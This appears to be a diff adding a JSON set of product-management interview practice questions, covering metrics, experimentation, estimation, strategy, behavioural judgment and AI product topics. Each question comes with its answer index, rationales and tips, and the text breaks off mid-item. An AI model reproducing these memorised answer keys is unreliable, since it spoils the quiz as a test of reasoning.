@@ -1,0 +1,637 @@
+{
+ "date": "2026-11-12",
+ "theme": "Hidden constraints and second-order costs",
+ "questions": [
+  {
+   "topic": "Product Sense",
+   "concept": "Re-onboarding lapsed users who return after a long absence",
+   "difficulty": "medium",
+   "question": "You're the PM for a budgeting-and-investing app. Many users who return after 6+ months of inactivity open the app once and leave again. The home screen shows the same dashboard as for daily users, now full of stale balances and dozens of unread alerts. What's the best first move?",
+   "options": [
+    "Build a 'welcome back' state that summarises what changed, refreshes linked accounts, and suggests one next step",
+    "Send returning users a push campaign with a discount on the premium plan to re-engage them",
+    "Clear all old alerts automatically so returning users see an empty, uncluttered dashboard",
+    "Show returning users the full first-time onboarding tutorial again from the beginning"
+   ],
+   "answer": 0,
+   "explanation": "Returning users aren't new users and aren't daily users: they remember the product but have lost context, and their data is stale. A dedicated welcome-back state rebuilds context (what changed), fixes the broken state (refresh stale connections), and gives one clear action. That turns a confusing return visit into a fresh moment of value.",
+   "rationales": [
+    "Correct: it matches the returning user's real situation: lost context and stale data. It restores both and gives a single clear next step.",
+    "A discount targets price, but these users already came back on their own. The leak is the confusing experience after they arrive, which a coupon won't fix.",
+    "Hiding the clutter helps a bit, but an empty dashboard with stale balances still doesn't tell the user what changed or what to do now.",
+    "Returning users already know the basics. Replaying the full tutorial feels patronising and adds friction instead of restoring context."
+   ],
+   "interview_tip": "Strong candidates segment users by state (new, active, lapsed, returning) rather than treating everyone the same. Spotting that returning users have their own needs shows mature product sense."
+  },
+  {
+   "topic": "Product Sense",
+   "concept": "Fitts's law: tap target size and distance",
+   "difficulty": "easy",
+   "question": "In a grocery app, users often tap 'Remove' by mistake when trying to tap the small '+' button next to it on the cart screen. Which design principle best explains the problem and the fix?",
+   "options": [
+    "Fitts's law: make the main targets larger and space conflicting actions further apart",
+    "Hick's law: reduce the number of choices on the cart screen to speed up decisions",
+    "Jakob's law: copy the cart layout of the most popular competing grocery app",
+    "Miller's law: limit the cart to about seven items so it fits in working memory"
+   ],
+   "answer": 0,
+   "explanation": "Fitts's law says the time and accuracy of hitting a target depend on its size and distance. Small, closely packed buttons cause mis-taps, especially on phones. The fix is bigger tap areas for frequent actions and more space (or separation) between actions with very different outcomes, like add and remove.",
+   "rationales": [
+    "Correct: the problem is target size and closeness. Bigger targets and more spacing directly reduce mis-taps.",
+    "Hick's law is about decision time growing with the number of choices. Users here know what they want; they just miss the button.",
+    "Copying familiar patterns can help learnability, but it doesn't address tiny, crowded tap targets causing errors.",
+    "Miller's law concerns how much people can hold in memory. Limiting cart size would hurt shoppers and doesn't fix mis-taps."
+   ],
+   "interview_tip": "Naming the right principle and turning it into a concrete fix shows you can reason about usability, not just features. Mention testing the change by tracking undo or re-add rates."
+  },
+  {
+   "topic": "Product Sense",
+   "concept": "Local number formats (lakh/crore) for Indian users",
+   "difficulty": "easy",
+   "question": "A global fintech app launches in India. Support tickets show users misreading amounts like '1,500,000' and doubting the app's figures. What's the simplest fix with the biggest trust impact?",
+   "options": [
+    "Format amounts using the Indian system (15,00,000 or ₹15 lakh) based on the user's locale",
+    "Add a tooltip next to every amount explaining how international digit grouping works",
+    "Remove all thousand separators so amounts appear as plain digits without commas",
+    "Show every amount in both rupees and US dollars so users can cross-check it"
+   ],
+   "answer": 0,
+   "explanation": "Indian users group digits as lakhs and crores (15,00,000), not millions (1,500,000). Showing numbers in an unfamiliar format makes people misread amounts, which is a trust problem in a money app. Formatting by locale removes the confusion at the source with almost no extra UI.",
+   "rationales": [
+    "Correct: it meets users in the format they already read fluently, which removes misreading at the source.",
+    "Tooltips put the burden on users to translate every number. Most won't open them, and the misreading continues.",
+    "Removing separators makes large numbers harder to read for everyone and increases the chance of errors.",
+    "Dual currency adds clutter and a second number to misread. It doesn't fix the grouping format problem."
+   ],
+   "interview_tip": "Localisation is more than translation. In interviews about launching in a new market, mentioning formats, payment methods and norms shows you think about real users, not just text strings."
+  },
+  {
+   "topic": "Product Sense",
+   "concept": "Free-cancellation grace window balancing buyer flexibility and seller cost",
+   "difficulty": "hard",
+   "question": "On a home-cleaning marketplace, customers want to cancel freely, but last-minute cancellations leave cleaners with lost income and they are starting to leave the platform. Customers complain loudly about any cancellation fee. What's the best policy design?",
+   "options": [
+    "Free cancellation until a cut-off (e.g., 12 hours before), then a fee paid mostly to the cleaner, shown clearly at booking",
+    "Charge a flat cancellation fee on every cancellation so that cleaners are always compensated",
+    "Keep cancellations free for customers and let cleaners cancel freely too, so both sides are treated equally",
+    "Ban customers who cancel more than three times, while keeping every cancellation free of charge"
+   ],
+   "answer": 0,
+   "explanation": "The cost of a cancellation depends on timing: early cancels let the cleaner rebook, late ones don't. A grace window keeps flexibility when it's cheap for the supply side and charges only when the cancel truly costs the cleaner. Sending the fee to the cleaner and showing the rule at booking makes it feel fair and protects the scarce side.",
+   "rationales": [
+    "Correct: it prices the actual harm (late cancels), protects cleaner income, and keeps early flexibility customers value. Clear disclosure reduces complaints.",
+    "A flat fee on every cancel punishes harmless early cancels, which angers customers and can cut demand more than needed.",
+    "Letting cleaners cancel freely too makes reliability worse for customers. 'Equal' rules don't fix the income loss that drives cleaners away.",
+    "Bans are blunt and only trigger after repeated harm. Each late cancel still leaves a cleaner unpaid in the meantime."
+   ],
+   "interview_tip": "Marketplace questions test whether you protect both sides. Strong answers tie the policy to when harm happens and who bears it, then explain how you'd watch both customer and supplier metrics."
+  },
+  {
+   "topic": "Metrics",
+   "concept": "Segmenting a signup drop by mobile carrier (OTP delivery failure)",
+   "difficulty": "hard",
+   "question": "Phone-number signups for an Indian social app fell 18% overnight. App versions, devices and marketing spend are unchanged. The funnel shows the drop is entirely at 'enter OTP'. What should you check first?",
+   "options": [
+    "Split OTP delivery and verification rates by mobile carrier and SMS provider to find a delivery failure",
+    "Run a survey asking recent drop-offs why they didn't finish signing up",
+    "Check whether a competitor launched a campaign that is pulling new users away",
+    "Redesign the OTP screen with a clearer layout and launch an A/B test of it"
+   ],
+   "answer": 0,
+   "explanation": "A sudden drop at one step with nothing changed in the product points to an external dependency in that step. OTPs depend on SMS providers and carrier delivery, which can fail for one carrier or route. Slicing delivery and verification by carrier and provider quickly confirms or rules this out, and the fix (failover to another provider) is fast.",
+   "rationales": [
+    "Correct: it targets the most likely cause of a sudden, step-specific drop: a delivery problem in the SMS chain, which you can check in hours.",
+    "Surveys are slow and drop-offs who never got a code may not even know why it failed. Use data first for a sudden break.",
+    "A competitor would reduce people starting signup, not cause failure at the OTP step for users already in the funnel.",
+    "Nothing changed on the screen, so a redesign doesn't match the timing. It also delays the real fix by weeks."
+   ],
+   "interview_tip": "In root-cause questions, interviewers want you to use the shape of the drop (sudden, one step) to narrow causes. Mentioning third-party dependencies like SMS gateways shows real-world experience."
+  },
+  {
+   "topic": "Metrics",
+   "concept": "Deduplicating users across web and app (identity resolution)",
+   "difficulty": "medium",
+   "question": "Your e-commerce company reports 'monthly active users' by adding web MAU (8M) and app MAU (6M) to get 14M. Many customers use both. Why is this a problem and what's the better approach?",
+   "options": [
+    "It double-counts people active on both; count unique users by logged-in ID and report overlap separately",
+    "It undercounts, since some users have multiple browsers; add a correction factor on top of 14M",
+    "It is fine as long as the same method is used every month, because only the trend matters",
+    "It is wrong because app users are more valuable; report app MAU alone as the headline metric"
+   ],
+   "answer": 0,
+   "explanation": "Adding platform counts double-counts anyone who uses both, so the total overstates reach, and it can rise just because people adopt a second platform. Counting unique people by a stable identity (logged-in account) gives true reach. Reporting overlap separately also tells you how cross-platform behaviour is changing.",
+   "rationales": [
+    "Correct: unique users by identity gives real reach, and the overlap number is useful on its own.",
+    "Multiple browsers can inflate web counts, but adding a factor on top makes the double-counting worse, not better.",
+    "Consistency doesn't save it: the total can grow when users add a platform without any new people, which misleads the trend.",
+    "App users may be worth more, but dropping web hides real users. Value weighting is a separate question from correct counting."
+   ],
+   "interview_tip": "Interviewers like candidates who question how a metric is counted before trusting it. Mentioning identity and double-counting shows rigour with data."
+  },
+  {
+   "topic": "Metrics",
+   "concept": "Reading a cohort retention table row",
+   "difficulty": "easy",
+   "question": "In a weekly cohort retention table, each row is the group of users who signed up in a given week, and each column is 'weeks since signup'. What does reading across one row tell you?",
+   "options": [
+    "How that one signup cohort's retention decays over the weeks after it joined",
+    "How retention for all cohorts changed during one calendar week",
+    "How many total users the product had in each calendar week",
+    "How each cohort compared with others in its very first week only"
+   ],
+   "answer": 0,
+   "explanation": "A row follows a single cohort over its life, so reading across shows how quickly that group stops coming back and whether it flattens. Reading down a column compares cohorts at the same age, which shows whether newer cohorts retain better. Diagonals line up calendar weeks, which helps spot one-off events.",
+   "rationales": [
+    "Correct: a row tracks one cohort through time since signup, showing its decay curve.",
+    "A single calendar week runs along a diagonal in this layout, not along a row.",
+    "Total users is an aggregate count; a cohort table shows percentages of each cohort that returned.",
+    "Comparing cohorts at the same age means reading down a column, such as the week-1 column."
+   ],
+   "interview_tip": "Being fluent with cohort tables lets you answer retention questions quickly. Say what rows, columns and diagonals show, then what pattern you'd look for."
+  },
+  {
+   "topic": "Metrics",
+   "concept": "Measuring end-to-end customer wait vs per-team SLAs",
+   "difficulty": "medium",
+   "question": "A B2B software company's support tiers all hit their SLAs: Tier 1 responds within 1 hour and Tier 2 within 4 hours. Yet customers rate support poorly and complain about waiting days. What's the most likely explanation and fix?",
+   "options": [
+    "Each team's clock restarts at handoffs; measure total time from customer request to resolution",
+    "Customers are being unreasonable; publish the SLAs so they know what to expect",
+    "The SLAs are too loose; cut Tier 1 to 30 minutes and Tier 2 to 2 hours",
+    "Survey scores are unreliable; stop using CSAT and focus only on internal SLA metrics"
+   ],
+   "answer": 0,
+   "explanation": "Per-team SLAs measure each team's slice, but customers feel the whole journey, including queue time between handoffs and back-and-forth. Every team can be 'green' while the end-to-end wait is days. Measuring time from request to resolution (and counting handoffs) shows where the real delay sits.",
+   "rationales": [
+    "Correct: it measures what the customer feels and exposes the gaps between teams that per-team SLAs hide.",
+    "The complaint matches a real measurement gap. Publishing SLAs doesn't shorten the wait.",
+    "Tighter per-team targets still don't capture time spent between teams, so the total wait may barely change.",
+    "The survey is pointing at a real problem. Dropping it would hide the customer's view, not fix it."
+   ],
+   "interview_tip": "A strong signal is defining metrics from the customer's point of view rather than the org chart. Mention the risk of local metrics that are all green while the experience is red."
+  },
+  {
+   "topic": "Experimentation",
+   "concept": "Counterfactual logging to define triggered users in both arms",
+   "difficulty": "medium",
+   "question": "You test a new 'frequently bought together' widget that only appears when a product has strong co-purchase data. You want to analyse only users who would see the widget. In control, the widget never renders, so you can't tell who would have seen it. What should you do?",
+   "options": [
+    "Run the trigger logic in both arms and log whether the widget would have shown, then compare those users",
+    "Compare treatment users who saw the widget against all control users who visited a product page",
+    "Analyse only treatment users, comparing those who clicked the widget with those who didn't",
+    "Skip triggered analysis and compare all users in both arms, since the effect will still show up"
+   ],
+   "answer": 0,
+   "explanation": "Triggered analysis needs the same population in both arms. Counterfactual logging runs the eligibility check in control too and records 'would have shown', so you compare like with like. That keeps randomisation valid and avoids diluting the effect with users who were never eligible.",
+   "rationales": [
+    "Correct: it identifies the same eligible group in both arms, giving a fair comparison with less noise.",
+    "This compares eligible treatment users with a broader control group, so differences may come from who was eligible, not the widget.",
+    "Clickers and non-clickers choose themselves, so this compares different kinds of users and says nothing causal.",
+    "It's valid but heavily diluted if few users are eligible, so you may miss a real effect or need far more traffic."
+   ],
+   "interview_tip": "Mentioning counterfactual logging shows you know how real experiment platforms work. Interviewers value candidates who protect randomisation while reducing noise."
+  },
+  {
+   "topic": "Experimentation",
+   "concept": "Experiment knowledge base to avoid re-running failed ideas",
+   "difficulty": "easy",
+   "question": "A new PM proposes testing a 'sticky add-to-cart button' on product pages. A senior engineer says the team tested the same idea two years ago, but nobody can find the results. What practice would have prevented this?",
+   "options": [
+    "A searchable experiment log with each test's hypothesis, setup, results and decision",
+    "A rule that no experiment idea can ever be tested a second time",
+    "Saving raw experiment data in the warehouse so analysts can rebuild results",
+    "Asking senior engineers to approve all new experiment ideas before launch"
+   ],
+   "answer": 0,
+   "explanation": "Without a record, teams forget what they learned and repeat tests, wasting traffic and time. A searchable log of hypothesis, setup, result and decision keeps learning reusable. It also lets you decide whether to re-test on purpose, for example because users or the page have changed a lot.",
+   "rationales": [
+    "Correct: it keeps learnings findable and lets teams build on past tests instead of repeating them.",
+    "Re-testing can be right when conditions change. A blanket ban throws away useful re-runs.",
+    "Raw data helps, but without the hypothesis and decision written down, people still won't know a test happened or what it meant.",
+    "Relying on people's memory doesn't scale and slows everyone down. It's the problem, not the fix."
+   ],
+   "interview_tip": "Talking about how teams keep learning from experiments signals experience running a testing program, not just single tests."
+  },
+  {
+   "topic": "Estimation",
+   "concept": "Annual bicycle unit sales in India",
+   "difficulty": "medium",
+   "question": "Bicycles remain common for school kids and rural commuters in India, though many households are moving to scooters. Roughly how many new bicycles does India buy in a year?",
+   "options": [
+    "About 1.5 million",
+    "About 15–20 million",
+    "About 60 million",
+    "About 150 million"
+   ],
+   "answer": 1,
+   "explanation": "Start with about 300 million households. Assume roughly half own at least one bicycle, with about 1.2 cycles each: around 180 million bikes in use. If a bicycle is replaced every 8–10 years, that's about 18–22 million a year. Add some first-time buyers and government school schemes, subtract households switching to two-wheelers, and you land around 15–20 million. Industry reports put the market in this range.",
+   "rationales": [
+    "Too low: it would mean only about 1 in 200 households buys a bike a year, which doesn't fit how common cycles are for kids and rural commuting.",
+    "Correct: an installed base of roughly 180 million and an 8–10 year replacement cycle gives about 15–20 million a year.",
+    "Too high: that would mean replacing the whole fleet every three years or a huge ownership base that India doesn't have.",
+    "Far too high: it equals about one new bike for every two households every year."
+   ],
+   "interview_tip": "For durable goods, use installed base divided by replacement cycle. Saying your assumptions out loud and sanity-checking against household counts matters more than the exact number."
+  },
+  {
+   "topic": "Estimation",
+   "concept": "Monthly revenue of a coworking centre from desk capacity and occupancy",
+   "difficulty": "medium",
+   "question": "A coworking centre in Bengaluru has 500 desks. Desks rent for about ₹8,000 per month, occupancy is around 75%, and meeting rooms and add-ons bring in about 10% extra. What's its approximate monthly revenue?",
+   "options": [
+    "About ₹3.3 lakh",
+    "About ₹33 lakh",
+    "About ₹3.3 crore",
+    "About ₹40 crore"
+   ],
+   "answer": 1,
+   "explanation": "Occupied desks: 500 × 75% = 375. Desk revenue: 375 × ₹8,000 = ₹30 lakh. Add 10% from meeting rooms and add-ons: about ₹33 lakh a month (roughly ₹4 crore a year). The key is applying occupancy to capacity before price.",
+   "rationales": [
+    "Off by a factor of 10: ₹3.3 lakh would mean only about 40 desks rented.",
+    "Correct: 375 occupied desks × ₹8,000 ≈ ₹30 lakh, plus 10% ≈ ₹33 lakh.",
+    "Off by 10 the other way: this is closer to the yearly revenue (about ₹4 crore) mistaken for monthly.",
+    "Far too high: it would need about ₹8 lakh per desk per month."
+   ],
+   "interview_tip": "Capacity × utilisation × price is a standard structure for physical businesses. Interviewers like it when you also note what the number means (about ₹4 crore a year) as a sanity check."
+  },
+  {
+   "topic": "Strategy",
+   "concept": "Contract lock-in masking weak product engagement",
+   "difficulty": "medium",
+   "question": "A B2B HR software company has 95% gross revenue retention, mostly from 3-year contracts. But weekly active usage per seat has fallen for four straight quarters. The CEO says retention proves the product is strong. What's the best response?",
+   "options": [
+    "Treat usage as the leading signal: contracts delay churn, so falling engagement predicts losses at renewal",
+    "Agree with the CEO, since revenue retention is the metric investors care about most",
+    "Push customers to sign longer contracts now to lock in revenue before usage falls further",
+    "Ignore usage per seat, since HR software is used infrequently by nature"
+   ],
+   "answer": 0,
+   "explanation": "Multi-year contracts make revenue retention a lagging metric: customers can't leave until renewal, even if they've stopped getting value. Falling usage is a leading signal that renewals, and expansions, are at risk. The right move is to find why engagement is dropping and fix it before the contracts come up.",
+   "rationales": [
+    "Correct: it separates contract lock-in from real product value and acts on the leading indicator before renewal.",
+    "Revenue retention matters, but it can't yet show what's coming with multi-year contracts. It looks backward here.",
+    "Longer contracts hide the problem for longer and may anger customers who aren't getting value. They don't fix engagement.",
+    "Usage may be naturally infrequent, but here it's falling over time against its own baseline, which is the warning sign."
+   ],
+   "interview_tip": "Interviewers test whether you can tell a real moat from a contractual delay. Pairing a lagging metric with a leading one shows strong business judgment."
+  },
+  {
+   "topic": "Strategy",
+   "concept": "Competing against a 'good enough' free bundled alternative",
+   "difficulty": "hard",
+   "question": "You run a standalone video-meeting product for businesses. A big office-suite company now includes 'good enough' video calls free with its suite, and your mid-market customers are churning to it. What's the strongest strategic response?",
+   "options": [
+    "Focus on segments where generic calls fall short (e.g., large webinars, regulated sectors) and build depth the bundle won't",
+    "Match the bundle by making your core product free and charging only for premium add-ons",
+    "Build your own office suite so you can bundle video calls the same way",
+    "Cut prices across all plans by 50% to make switching to the bundle less attractive"
+   ],
+   "answer": 0,
+   "explanation": "A free bundle wins wherever 'good enough' is enough, because the buyer already pays for the suite. You can't win on price against free. Instead, find segments where the generic tool clearly fails, deepen the product there, and make the value obvious. That gives buyers a reason to pay separately.",
+   "rationales": [
+    "Correct: it competes where the bundle is weak and avoids a price fight you can't win.",
+    "Free core with add-ons fights on price against a product that's already free to the buyer, and destroys your revenue.",
+    "Building a full office suite is a huge, slow bet against a giant's main strength. It's not a realistic answer to churn.",
+    "A cheaper paid product is still more expensive than free, so the bundle keeps winning while your margins shrink."
+   ],
+   "interview_tip": "Strategy questions about bundling reward answers that refuse to compete on the incumbent's terms. Naming specific segments where the bundle fails shows you can turn strategy into a plan."
+  },
+  {
+   "topic": "Strategy",
+   "concept": "Sachet pricing: smaller units to fit cash-constrained budgets",
+   "difficulty": "easy",
+   "question": "A premium shampoo brand sells only 400 ml bottles at ₹450 in India and struggles in smaller towns. Many buyers there earn and spend daily. What pricing approach best fits these customers?",
+   "options": [
+    "Offer small single-use packs at a low price point so buyers can purchase with daily cash",
+    "Cut the 400 ml bottle price by 30% to make it more affordable everywhere",
+    "Run a buy-one-get-one-free offer on 400 ml bottles during festivals",
+    "Sell through e-commerce only, where prices can be compared and discounted"
+   ],
+   "answer": 0,
+   "explanation": "For buyers with daily cash flow, the barrier is the upfront ticket size, not the price per ml. Sachets lower the entry price so they can buy when they have cash, often at a similar or higher margin per ml. This 'sachet' approach is a classic way FMCG brands reached India's mass market.",
+   "rationales": [
+    "Correct: it removes the real barrier, the large upfront payment, without cutting the per-unit price.",
+    "Even at 30% off, ₹315 is still a large one-time spend for a daily-wage buyer, and margins drop for every customer.",
+    "BOGO makes the upfront cost even bigger and only runs briefly, so it doesn't fit cash-constrained buyers.",
+    "Online-only skips the local shops where these buyers actually buy, which makes reach worse."
+   ],
+   "interview_tip": "For India-market questions, interviewers like candidates who know the customer's cash flow shapes buying. Sachet thinking applies to digital too, like small data packs or pay-per-use."
+  },
+  {
+   "topic": "Execution",
+   "concept": "Walking skeleton to surface integration risk early",
+   "difficulty": "medium",
+   "question": "Your team is building a new checkout across four components: cart service, payments partner, fraud check and order service. Each team plans to finish its part fully before connecting them in month three. What's the best change to the plan?",
+   "options": [
+    "Build a thin end-to-end version first that connects all four with minimal logic, then flesh out each part",
+    "Keep the plan but add a two-week buffer at the end for integration fixes",
+    "Have one team build all four components to avoid coordination issues",
+    "Write a detailed interface spec now so integration in month three goes smoothly"
+   ],
+   "answer": 0,
+   "explanation": "Integration is where hidden problems show up: mismatched formats, latency, auth, partner quirks. Leaving it to the end means discovering them when there's no time left. A walking skeleton connects every piece early with minimal logic, so the riskiest unknowns surface in week two, and each team then builds on a working path.",
+   "rationales": [
+    "Correct: it brings integration risk forward, when it's cheap to fix, and gives everyone a working end-to-end path.",
+    "A buffer assumes you know how big the problems will be. Integration surprises often need far more than two weeks.",
+    "One team would be much slower and still face the payments partner integration late.",
+    "Specs help, but real systems often behave differently from the doc. Only connecting them proves they work."
+   ],
+   "interview_tip": "Talking about retiring integration risk early shows you've shipped complex launches. Interviewers like 'connect end-to-end first' over 'perfect each piece separately'."
+  },
+  {
+   "topic": "Execution",
+   "concept": "Planning sprint capacity net of leave and on-call",
+   "difficulty": "easy",
+   "question": "Your team of 6 engineers usually completes about 30 points per two-week sprint. Next sprint, two engineers are on leave for the full sprint and one is on on-call duty, which usually takes half their time. How many points should you plan for?",
+   "options": [
+    "About 17–18 points, based on the capacity actually available",
+    "About 30 points, since the team's average velocity should stay the same",
+    "About 20 points, removing only the two engineers who are on leave",
+    "About 35 points, to push the team to catch up on lost time"
+   ],
+   "answer": 0,
+   "explanation": "Velocity reflects the team's normal capacity: about 5 points per engineer here. Available capacity is 3 full engineers plus half of one, or 3.5 engineers, which gives about 17–18 points. Planning on real capacity avoids a sprint that's set up to fail.",
+   "rationales": [
+    "Correct: 3.5 effective engineers × about 5 points each ≈ 17–18 points.",
+    "Average velocity assumes a normal team size. With half the team out, planning 30 points guarantees missing the goal.",
+    "This accounts for leave but forgets that on-call takes about half of one engineer's time.",
+    "Planning above normal velocity with fewer people leads to burnout and missed commitments."
+   ],
+   "interview_tip": "Simple capacity maths shows you plan realistically. Interviewers like PMs who protect commitments by planning around known absences."
+  },
+  {
+   "topic": "Execution",
+   "concept": "Data exposure response order: contain, scope, then notify",
+   "difficulty": "medium",
+   "question": "An engineer tells you a bug in your app's 'share order' link exposed other customers' names and addresses to anyone with the link for the past three days. What should happen first?",
+   "options": [
+    "Disable the faulty links to stop further exposure, then scope who was affected and bring in security and legal",
+    "Email all customers right away to apologise before the issue spreads on social media",
+    "Write a full root-cause analysis so you can explain exactly what went wrong",
+    "Quietly fix the bug in the next release, since there's no proof anyone misused the data"
+   ],
+   "answer": 0,
+   "explanation": "The first job is to stop the harm: disable the leaking links now. Then scope it (which records, how many users, who accessed what) and bring in security and legal, who know the notification rules and deadlines, such as those under India's data protection law. Communication to customers follows once you know the facts, and the root-cause review comes after the incident.",
+   "rationales": [
+    "Correct: contain first, then scope and involve experts who own the legal notification process.",
+    "Customers should be told, but emailing before you know who was affected or stopping the leak risks wrong information and ongoing harm.",
+    "Root-cause analysis matters but comes after the exposure is stopped. Doing it first lets the leak continue.",
+    "Hiding a data exposure can break legal duties and destroy trust. Lack of evidence of misuse isn't proof it didn't happen."
+   ],
+   "interview_tip": "Incident questions test order of operations under pressure. A strong answer stops the bleeding, scopes the impact, involves the right experts, and is honest with users."
+  },
+  {
+   "topic": "Behavioural",
+   "concept": "Sharing disagreement with your manager's plan when your skip-level asks",
+   "difficulty": "hard",
+   "question": "In a skip-level 1:1, your director asks what you think of your manager's new roadmap. You have real concerns about its sequencing, which you raised with your manager last week; they heard you out but kept the plan. What's the best response?",
+   "options": [
+    "Share your concerns honestly and factually, say you've discussed them with your manager, and tell your manager you did so",
+    "Say the roadmap is solid, since criticising your manager to their boss would damage the relationship",
+    "Lay out every weakness you see so the director can step in and overrule your manager",
+    "Decline to comment and suggest the director ask your manager directly instead"
+   ],
+   "answer": 0,
+   "explanation": "Being asked directly is a chance to be candid, but in a way that keeps trust. Share your concerns as facts and reasoning, make clear you've already raised them with your manager, and avoid trying to get them overruled. Telling your manager afterwards keeps everything in the open. This shows both integrity and loyalty.",
+   "rationales": [
+    "Correct: it's honest, respects the chain of trust, and avoids surprises for your manager.",
+    "Hiding real concerns when asked directly is a failure of candour and can hurt the business if the concerns are valid.",
+    "Pushing for your manager to be overruled turns a question into an end-run, which damages trust across the team.",
+    "Avoiding the question denies the director useful input and looks evasive. You can share views without undermining anyone."
+   ],
+   "interview_tip": "Amazon-style 'Have Backbone; Disagree and Commit' questions look for candour plus transparency. Mention that you'd already raised it with your manager first; that's what interviewers listen for."
+  },
+  {
+   "topic": "Behavioural",
+   "concept": "Reconciling conflicting numbers with a partner team before an exec review",
+   "difficulty": "hard",
+   "question": "The day before a quarterly exec review, you see that the marketing team's slides show 2.1M new users for the quarter while your product dashboard shows 1.6M. Both will be presented. What do you do?",
+   "options": [
+    "Contact the marketing lead today to find the definition gap, agree one number or explain both, and present together",
+    "Present your 1.6M number, since product data is the source of truth for user counts",
+    "Flag in the review that marketing's number is inflated so leaders don't make decisions on it",
+    "Remove the user count from your slides to avoid a confusing conflict in the meeting"
+   ],
+   "answer": 0,
+   "explanation": "Two numbers for the same thing in front of executives destroys trust in both teams' data. The gap is usually a definition difference (signups vs activated, different dates or channels). Working it out with the partner team beforehand lets you show one aligned number, or both with a clear explanation, and keeps the relationship strong.",
+   "rationales": [
+    "Correct: it fixes the problem before the meeting, finds the real cause, and keeps both teams aligned.",
+    "Assuming your data is right without checking may be wrong, and two conflicting slides still confuse leaders.",
+    "Calling out a partner in front of executives without talking first damages trust and may be unfair if the definitions differ.",
+    "Hiding the number avoids the moment but leaves the conflict and the risk of bad decisions."
+   ],
+   "interview_tip": "This tests Earn Trust and Dive Deep. Strong answers resolve disagreements privately and early, and show curiosity about why numbers differ rather than who is wrong."
+  },
+  {
+   "topic": "Behavioural",
+   "concept": "Pitching a promising opportunity outside your team's charter",
+   "difficulty": "hard",
+   "question": "While researching your payments product, you find that many small sellers need simple inventory tracking, which no team owns. You believe it could be a big opportunity, but it's outside your team's charter. What's the best approach?",
+   "options": [
+    "Write a short opportunity memo with evidence, run a cheap test, and bring it to leadership with a proposed owner",
+    "Start building it quietly with your team, since results will justify it later",
+    "Leave it alone, because it is outside your charter and your roadmap is already full",
+    "Post the idea in a company-wide channel so whichever team is interested can pick it up"
+   ],
+   "answer": 0,
+   "explanation": "Thinking big means not ignoring an opportunity just because it isn't yours, but acting through the right channel. A crisp memo with evidence and a cheap validation test makes the case. Bringing it to leadership with a suggested owner, which might not be you, lets the company decide without derailing your current commitments.",
+   "rationales": [
+    "Correct: it combines ownership and initiative with respect for priorities and how decisions get made.",
+    "Building without approval pulls your team off its commitments and surprises leaders, which damages trust.",
+    "Ignoring a promising, evidence-backed opportunity is a failure of ownership. You can raise it without dropping your work.",
+    "Posting it widely without evidence or an owner usually means nobody takes it on."
+   ],
+   "interview_tip": "Interviewers look for ownership beyond your scope plus judgment about how to move it forward. Saying you'd propose an owner, even if not you, shows maturity."
+  },
+  {
+   "topic": "AI Product",
+   "concept": "Choosing top-k retrieved chunks: recall vs noise and cost",
+   "difficulty": "medium",
+   "question": "Your RAG support bot retrieves the top 3 chunks per question and often misses the right policy. An engineer proposes jumping to the top 50 chunks. What's the most likely outcome?",
+   "options": [
+    "Recall rises, but cost and latency grow and extra irrelevant chunks can distract the model; tune k with evals and reranking",
+    "Answers will improve in all cases, since the model always does better with more context",
+    "Nothing changes, because the model only uses the first chunk it receives anyway",
+    "Hallucinations will disappear, because the right answer will always be in the context"
+   ],
+   "answer": 0,
+   "explanation": "Raising k increases the chance the right chunk is included, but it also adds tokens (cost and latency) and noise, which can make the model pick the wrong passage. The usual pattern is to retrieve more candidates, rerank them, and pass a smaller, better set to the model, choosing k by measuring answer quality on an eval set.",
+   "rationales": [
+    "Correct: it captures the trade-off and the standard fix: retrieve wide, rerank, pass fewer, and tune with evals.",
+    "More context isn't always better: irrelevant passages can confuse the model and push the right one out of focus.",
+    "Models do use content beyond the first chunk, so changing k does change answers.",
+    "The model can still misread or ignore the right chunk, especially among many distractors, so hallucinations don't vanish."
+   ],
+   "interview_tip": "AI PM interviews often probe whether you see RAG settings as trade-offs. Mentioning reranking and choosing settings with evals shows practical experience."
+  },
+  {
+   "topic": "AI Product",
+   "concept": "Self-preference bias when an LLM judges its own model family",
+   "difficulty": "hard",
+   "question": "You're comparing your current assistant (built on Model X) with a candidate built on Model Y. Your automated judge is also Model X, and it rates the Model X outputs much higher. Human reviewers on a sample see the two as about equal. What's the most likely issue and fix?",
+   "options": [
+    "The judge favours outputs from its own model family; use a different judge model and calibrate against human labels",
+    "Human reviewers are less reliable than the judge, so trust the automated scores",
+    "The sample was too small; run the same judge on ten times more outputs",
+    "Model Y is worse at following the judge's rubric, so change Model Y's prompts to match"
+   ],
+   "answer": 0,
+   "explanation": "LLM judges can prefer outputs that match their own style, which inflates scores for their own model family. When the judge disagrees with humans in this pattern, it's a warning sign. Use a judge from a different family (or several), and check its agreement with human labels before trusting it for model choices.",
+   "rationales": [
+    "Correct: it identifies self-preference bias and fixes it with an independent judge checked against humans.",
+    "Humans are the reference you calibrate judges against. A judge that disagrees with them on a pattern like this needs checking.",
+    "A bigger sample with the same biased judge just gives a more confident wrong answer.",
+    "Tuning Model Y to please a biased judge optimises for the bias, not for users."
+   ],
+   "interview_tip": "Knowing the specific ways LLM judges fail (position, length, self-preference) and how to calibrate them signals you can be trusted to run evals that drive real decisions."
+  },
+  {
+   "topic": "AI Product",
+   "concept": "Clear labelling guidelines with examples to improve label consistency",
+   "difficulty": "easy",
+   "question": "Your team hires annotators to label chatbot answers as 'helpful' or 'not helpful'. Agreement between annotators is low, and they often label the same answer differently. What's the best first fix?",
+   "options": [
+    "Write clear guidelines with definitions and worked examples, including tricky edge cases",
+    "Hire more annotators and take a majority vote on each answer",
+    "Replace the annotators with an LLM that labels all answers automatically",
+    "Drop the low-agreement items from the dataset and keep only the easy ones"
+   ],
+   "answer": 0,
+   "explanation": "Low agreement usually means the task is unclear: people have different ideas of 'helpful'. Clear definitions with concrete examples, especially borderline cases, align how people judge. Then measure agreement again; it should rise before you scale labelling.",
+   "rationales": [
+    "Correct: it fixes the root cause, an unclear task, so labels become consistent.",
+    "Voting smooths noise but doesn't fix confusion about what 'helpful' means, and costs more.",
+    "An LLM labeller needs the same clear definitions; without them it will be consistent but may be consistently wrong.",
+    "Dropping hard items biases the data toward easy cases, where your model matters least."
+   ],
+   "interview_tip": "Showing you'd fix the labelling instructions before throwing more labellers at the problem signals practical ML product experience."
+  },
+  {
+   "topic": "AI Product",
+   "concept": "Checkpointing long-running agent tasks to resume after failures",
+   "difficulty": "medium",
